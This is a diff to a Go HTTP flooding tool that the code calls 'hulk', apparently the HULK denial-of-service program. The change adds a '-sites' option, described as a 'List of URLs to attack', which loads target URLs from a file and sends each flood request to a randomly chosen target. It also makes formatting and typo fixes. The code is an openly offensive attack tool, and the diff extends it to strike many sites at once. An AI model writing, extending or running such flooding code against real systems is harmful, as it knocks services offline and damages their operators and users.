@@ -23,13 +23,13 @@ import (
 	"syscall"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -45,6 +45,8 @@ var (
 		//"http://www.google.ru/?hl=ru&q=",
 		//"http://yandex.ru/yandsearch?text=",
 	}
+	allSites []*url.URL = []*url.URL{}
+
 	headersUseragents []string = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
 		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
@@ -78,6 +80,7 @@ func main() {
 	var (
 		version bool
 		site    string
+		sites   string
 		agents  string
 		data    string
 		headers arrayFlags
@@ -89,6 +92,7 @@ func main() {
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
+	flag.StringVar(&sites, "sites", "", "List of URLs to attack")
 	flag.Parse()
 
 	t := os.Getenv("HULKMAXPROCS")
@@ -98,9 +102,28 @@ func main() {
 	}
 
 	u, err := url.Parse(site)
-	if err != nil {
+	if err != nil && sites == "" {
 		fmt.Println("err parsing url parameter\n")
 		os.Exit(1)
+	}
+
+	if sites != "" {
+		if data, err := ioutil.ReadFile(sites); err == nil {
+			for _, a := range strings.Split(string(data), "\n") {
+				if strings.TrimSpace(a) == "" {
+					continue
+				}
+				currentURL, err := url.Parse(a)
+				if err != nil {
+					fmt.Println("err parsing url in site list \n")
+					os.Exit(1)
+				}
+				allSites = append(allSites, currentURL)
+			}
+		} else {
+			fmt.Printf("can'l load url list from %s\n", sites)
+			os.Exit(1)
+		}
 	}
 
 	if version {
@@ -118,7 +141,7 @@ func main() {
 				headersUseragents = append(headersUseragents, a)
 			}
 		} else {
-			fmt.Printf("can'l load User-Agent list from %s\n", agents)
+			fmt.Printf("can't load User-Agent list from %s\n", agents)
 			os.Exit(1)
 		}
 	}
@@ -132,7 +155,13 @@ func main() {
 		fmt.Println("In use               |\tResp OK |\tGot err")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-				go httpcall(site, u.Host, data, headers, ss)
+				var currentSite string
+				if len(allSites) > 0 {
+					currentSite = pickRandomSite().String()
+				} else {
+					currentSite = site
+				}
+				go httpcall(currentSite, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
 				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
@@ -229,4 +258,9 @@ func buildblock(size int) (s string) {
 		a = append(a, rune(rand.Intn(25)+65))
 	}
 	return string(a)
+}
+
+func pickRandomSite() (u *url.URL) {
+	randomIndex := rand.Intn(len(allSites))
+	return allSites[randomIndex]
 }
